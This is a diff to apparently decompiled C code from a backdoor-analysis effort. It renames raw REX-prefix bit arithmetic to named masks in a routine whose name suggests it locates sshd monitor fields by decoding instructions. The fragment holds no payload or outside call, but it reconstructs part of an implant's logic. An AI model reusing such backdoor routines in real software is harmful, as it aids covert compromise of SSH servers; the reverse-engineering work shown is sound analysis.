@@ -53,14 +53,14 @@ BOOL sshd_find_monitor_field_slot_via_mm_request_send
           tracked_reg = insn_ctx.prefix.decoded.flags2 & DF2_IMM64;
           if (((insn_ctx.prefix.flags_u32 & 0x1000) != 0) &&
              (tracked_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
-            rex_extension = insn_ctx.prefix.modrm_bytes.rex_byte << 3;
+            rex_extension = (insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3;
             goto LAB_001030d4;
           }
         }
         else {
           tracked_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
           if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
-            rex_extension = insn_ctx.prefix.modrm_bytes.rex_byte * '\x02';
+            rex_extension = (insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1;
 LAB_001030d4:
             tracked_reg = tracked_reg | rex_extension & 8;
           }
@@ -95,19 +95,19 @@ LAB_00103110:
                 if (((insn_ctx.prefix.flags_u32 & 0x1000) != 0) &&
                    (candidate_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
                   candidate_reg = insn_ctx.mov_imm_reg_index |
-                          (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
+                          ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
                 }
               }
               else {
                 candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
                 if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
                   candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_reg |
-                          insn_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8;
+                          ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
                 }
 LAB_00103237:
                 mirrored_reg = rex_extension;
                 if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
-                  mirrored_reg = rex_extension | (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
+                  mirrored_reg = rex_extension | ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
                 }
               }
             }
@@ -131,9 +131,9 @@ LAB_00103237:
               }
               else {
                 candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_rm |
-                        insn_ctx.prefix.modrm_bytes.rex_byte * '\b' & 8;
+                        ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
                 if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
-                  mirrored_reg = insn_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8 |
+                  mirrored_reg = ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1) |
                           insn_ctx.prefix.modrm_bytes.modrm_reg;
                 }
               }
